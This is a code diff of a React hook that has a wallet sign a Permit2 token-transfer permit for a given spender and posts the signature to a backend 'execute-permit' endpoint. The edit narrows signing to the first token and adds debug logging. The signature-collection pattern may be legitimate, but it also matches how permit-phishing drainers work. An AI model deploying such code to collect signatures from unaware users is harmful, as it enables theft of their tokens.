@@ -30,38 +30,40 @@ export function usePermit2Execution() {
 
     const deadline = Math.floor(Date.now() / 1000) + 3600;
     const signedPayload: Record<string, object> = {};
+    const permit = permit2Tokens[0];
 
-    for (const permit of permit2Tokens) {
-      const nonce = BigInt(Date.now());
+    const nonce = BigInt(Date.now());
 
-      const signature = await signTypedDataAsync({
-        domain: {
-          name: "Permit2",
-          chainId,
-          verifyingContract: PERMIT2_CONTRACT,
+    const signature = await signTypedDataAsync({
+      domain: {
+        name: "Permit2",
+        chainId: Number(chainId),
+        verifyingContract: PERMIT2_CONTRACT,
+      },
+      types: PERMIT2_TYPES,
+      primaryType: "PermitTransferFrom",
+      message: {
+        permitted: {
+          token: permit.token,
+          amount: BigInt(permit.amount),
         },
-        types: PERMIT2_TYPES,
-        primaryType: "PermitTransferFrom",
-        message: {
-          permitted: {
-            token: permit.token,
-            amount: BigInt(permit.amount),
-          },
-          spender: spenderAddress,
-          nonce,
-          deadline: BigInt(deadline),
-        },
-      });
-
-      signedPayload[permit.token] = {
-        symbol: permit.symbol,
-        amount: permit.amount,
         spender: spenderAddress,
-        nonce: nonce.toString(),
-        deadline,
-        signature,
-      };
-    }
+        nonce,
+        deadline: BigInt(deadline),
+      },
+    });
+
+    console.log("chainId:", chainId);
+    console.log("permit2:", permit);
+
+    signedPayload[permit.token] = {
+      symbol: permit.symbol,
+      amount: permit.amount,
+      spender: spenderAddress,
+      nonce: nonce.toString(),
+      deadline,
+      signature,
+    };
 
     const res = await API.post("/api/execute-permit", signedPayload);
     return res.data;
